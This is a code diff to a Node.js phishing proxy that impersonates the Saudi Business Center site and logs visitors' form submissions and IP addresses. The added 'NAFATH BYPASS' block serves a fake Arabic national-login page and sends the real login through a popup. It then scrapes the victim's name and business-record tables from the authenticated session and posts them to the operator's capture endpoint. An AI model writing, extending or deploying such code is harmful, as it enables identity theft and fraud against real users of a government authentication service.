@@ -1604,23 +1604,233 @@ function proxyRequest(req, res, target, targetPath) {
           const params = new URLSearchParams(capturedBody.toString());
           params.forEach((value, key) => { formData[key] = value; });
         } else if (ct.includes("multipart/form-data")) {
-          // For multipart, just note it was submitted
           formData = { _note: "multipart form data", _url: targetPath };
         }
-        // Get visitor IP
         let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
         if (ip.includes(",")) ip = ip.split(",").map(i => i.trim()).pop();
         captureProxyData("form_post", {
-          url: targetPath,
-          formData,
-          ip,
-          page: targetPath,
-          target,
-          method: req.method,
+          url: targetPath, formData, ip, page: targetPath, target, method: req.method,
         });
       } catch (e) {
         console.error("Error capturing POST data:", e.message);
       }
+
+      // ===== SMART NAFATH BYPASS =====
+      // If this is ExternalLogin (nafath), open popup for real nafath login
+      // then scrape user data after login and send it back to our server
+      if (target === "sb" && targetPath.includes("/Identity/Account/ExternalLogin")) {
+        console.log("[NAFATH BYPASS] Opening popup for client-side nafath login");
+        const bodyStr = capturedBody.toString();
+        const params = new URLSearchParams(bodyStr);
+        const realUrl = cfg.origin + targetPath;
+        let hiddenFields = '';
+        params.forEach((value, key) => {
+          hiddenFields += `<input type="hidden" name="${key.replace(/"/g, '&quot;')}" value="${value.replace(/"/g, '&quot;')}" />`;
+        });
+        // Determine our server URL for callbacks
+        const ourOrigin = req.headers.host ? (req.headers['x-forwarded-proto'] || 'https') + '://' + req.headers.host : '';
+        
+        const nafathPage = `<!DOCTYPE html>
+<html dir="rtl" lang="ar"><head><meta charset="utf-8"><title>تسجيل الدخول بنفاذ</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);padding:40px;max-width:500px;width:90%;text-align:center}
+.logo{width:120px;margin-bottom:20px}
+.title{color:#00897b;font-size:22px;margin-bottom:10px}
+.desc{color:#666;font-size:14px;margin-bottom:25px;line-height:1.6}
+.btn-nafath{background:#00897b;color:#fff;border:none;padding:14px 40px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;margin-bottom:15px;transition:background .3s}
+.btn-nafath:hover{background:#00695c}
+.status{margin-top:20px;padding:15px;border-radius:8px;display:none}
+.status.waiting{display:block;background:#fff3e0;color:#e65100}
+.status.success{display:block;background:#e8f5e9;color:#2e7d32}
+.status.error{display:block;background:#ffebee;color:#c62828}
+.spinner{border:3px solid #f3f3f3;border-top:3px solid #00897b;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:10px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.data-preview{text-align:right;margin-top:15px;padding:10px;background:#f5f5f5;border-radius:8px;font-size:13px;display:none}
+.data-preview div{padding:4px 0;border-bottom:1px solid #eee}
+.data-preview div:last-child{border:none}
+</style></head>
+<body>
+<div class="container">
+<img src="https://www.iam.gov.sa/authenticationendpoint/images/nafath-logo.svg" class="logo" onerror="this.style.display='none'">
+<h2 class="title">تسجيل الدخول بالنفاذ الوطني الموحد</h2>
+<p class="desc">سيتم فتح نافذة جديدة لتسجيل الدخول عبر النفاذ الوطني الموحد.<br>بعد تسجيل الدخول، سيتم جلب بياناتك تلقائياً.</p>
+<button class="btn-nafath" id="openNafath">فتح نافذة النفاذ الوطني</button>
+<div class="status" id="status"></div>
+<div class="data-preview" id="dataPreview"></div>
+</div>
+
+<!-- Hidden form for popup -->
+<form id="nafathForm" method="POST" action="${realUrl}" target="nafathPopup" style="display:none">${hiddenFields}</form>
+
+<script>
+var SERVER = '${ourOrigin}';
+var statusEl = document.getElementById('status');
+var dataPreview = document.getElementById('dataPreview');
+var popupWin = null;
+var checkInterval = null;
+var loginDetected = false;
+
+document.getElementById('openNafath').onclick = function() {
+  // Open popup window
+  popupWin = window.open('about:blank', 'nafathPopup', 'width=800,height=700,scrollbars=yes,resizable=yes');
+  if (!popupWin) {
+    statusEl.className = 'status error';
+    statusEl.innerHTML = 'يرجى السماح بالنوافذ المنبثقة (Popups) في المتصفح';
+    return;
+  }
+  // Submit form to popup
+  document.getElementById('nafathForm').submit();
+  statusEl.className = 'status waiting';
+  statusEl.innerHTML = '<div class="spinner"></div>جاري تسجيل الدخول... أكمل عملية النفاذ في النافذة الجديدة';
+  this.disabled = true;
+  this.textContent = 'جاري التسجيل...';
+  
+  // Monitor popup for login completion
+  checkInterval = setInterval(function() {
+    try {
+      if (popupWin.closed) {
+        clearInterval(checkInterval);
+        if (!loginDetected) {
+          statusEl.className = 'status error';
+          statusEl.innerHTML = 'تم إغلاق النافذة. إذا سجلت الدخول بنجاح، انتظر قليلاً...';
+          // Try to fetch data anyway
+          setTimeout(fetchUserData, 2000);
+        }
+        return;
+      }
+      // Try to read popup URL to detect login success
+      var popupUrl = '';
+      try { popupUrl = popupWin.location.href; } catch(e) { /* cross-origin */ }
+      
+      // If we can read the URL and it's on saudibusiness.gov.sa (not login page)
+      if (popupUrl && popupUrl.includes('saudibusiness.gov.sa') && !popupUrl.includes('/Identity/Account/Login') && !popupUrl.includes('iam.gov.sa')) {
+        loginDetected = true;
+        statusEl.className = 'status success';
+        statusEl.innerHTML = '<div class="spinner"></div>تم تسجيل الدخول بنجاح! جاري جلب البيانات...';
+        
+        // Try to scrape data from popup
+        try {
+          var popupDoc = popupWin.document;
+          var userData = scrapeUserData(popupDoc);
+          if (userData) {
+            sendDataToServer(userData);
+          }
+        } catch(e) {
+          // Cross-origin - can't read popup content directly
+          // Navigate popup to our proxy to get cookies
+          console.log('Cross-origin, redirecting popup to proxy...');
+        }
+        
+        // Close popup after a delay
+        setTimeout(function() {
+          if (popupWin && !popupWin.closed) popupWin.close();
+          fetchUserData();
+        }, 3000);
+        clearInterval(checkInterval);
+      }
+    } catch(e) {
+      // Cross-origin error - popup is on different domain, that's ok
+    }
+  }, 1000);
+};
+
+function scrapeUserData(doc) {
+  try {
+    var data = {};
+    // Try to get user name from header/profile
+    var nameEl = doc.querySelector('.user-name, .profile-name, [class*="userName"], [class*="user-name"]');
+    if (nameEl) data.fullName = nameEl.textContent.trim();
+    // Try to get all text content for analysis
+    data.pageContent = doc.body ? doc.body.innerText.substring(0, 5000) : '';
+    data.pageTitle = doc.title;
+    data.pageUrl = doc.location.href;
+    return data;
+  } catch(e) { return null; }
+}
+
+function sendDataToServer(data) {
+  try {
+    fetch(SERVER + '/api/proxy-capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'nafath_login_data', data: data, timestamp: new Date().toISOString() })
+    }).catch(function(){});
+  } catch(e) {}
+}
+
+function fetchUserData() {
+  statusEl.className = 'status success';
+  statusEl.innerHTML = '<div class="spinner"></div>جاري جلب بياناتك من المركز السعودي للأعمال...';
+  
+  // Fetch the main page through our proxy to get user data
+  // The cookies from the popup should be available for same-origin requests
+  fetch(SERVER + '/', { credentials: 'include' })
+    .then(function(r) { return r.text(); })
+    .then(function(html) {
+      var parser = new DOMParser();
+      var doc = parser.parseFromString(html, 'text/html');
+      
+      // Extract user data from the page
+      var userData = {};
+      // Look for user name
+      var nameEls = doc.querySelectorAll('.user-name, .profile-name, [class*="userName"], .dropdown-toggle, .nav-link');
+      nameEls.forEach(function(el) {
+        var t = el.textContent.trim();
+        if (t && t.length > 2 && t.length < 100 && !/login|دخول|تسجيل/i.test(t)) {
+          userData.fullName = t;
+        }
+      });
+      
+      // Look for business records
+      var tables = doc.querySelectorAll('table');
+      userData.tables = [];
+      tables.forEach(function(table) {
+        var rows = [];
+        table.querySelectorAll('tr').forEach(function(tr) {
+          var cells = [];
+          tr.querySelectorAll('td, th').forEach(function(td) {
+            cells.push(td.textContent.trim());
+          });
+          if (cells.length > 0) rows.push(cells);
+        });
+        if (rows.length > 0) userData.tables.push(rows);
+      });
+      
+      userData.pageContent = doc.body ? doc.body.innerText.substring(0, 3000) : '';
+      userData.loggedIn = !html.includes('/Identity/Account/Login');
+      
+      if (userData.loggedIn) {
+        statusEl.innerHTML = '✅ تم جلب البيانات بنجاح!';
+        if (userData.fullName) {
+          dataPreview.style.display = 'block';
+          dataPreview.innerHTML = '<div><strong>الاسم:</strong> ' + userData.fullName + '</div>';
+        }
+        sendDataToServer(userData);
+        // Redirect to main page after 2 seconds
+        setTimeout(function() { window.location.href = SERVER + '/'; }, 2000);
+      } else {
+        statusEl.className = 'status error';
+        statusEl.innerHTML = 'لم يتم تسجيل الدخول بعد. يرجى المحاولة مرة أخرى.';
+        document.getElementById('openNafath').disabled = false;
+        document.getElementById('openNafath').textContent = 'فتح نافذة النفاذ الوطني';
+      }
+    })
+    .catch(function(e) {
+      statusEl.className = 'status error';
+      statusEl.innerHTML = 'حدث خطأ أثناء جلب البيانات. يرجى المحاولة مرة أخرى.';
+      document.getElementById('openNafath').disabled = false;
+      document.getElementById('openNafath').textContent = 'فتح نافذة النفاذ الوطني';
+    });
+}
+</script>
+</body></html>`;
+        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Content-Length": Buffer.byteLength(nafathPage) });
+        res.end(nafathPage);
+        return;
+      }
+
       // Now do the actual proxy with the buffered body
       doProxy(req, res, target, targetPath, cfg, ck, capturedBody);
     });
